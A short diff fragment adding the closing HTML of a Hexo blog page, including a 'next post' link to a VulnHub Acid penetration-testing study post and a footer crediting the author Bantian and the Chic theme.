+            <a class="next" rel="next" href="/2020/06/17/VulnHub_Acid/">VulnHub_Acid靶机渗透测试学习</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
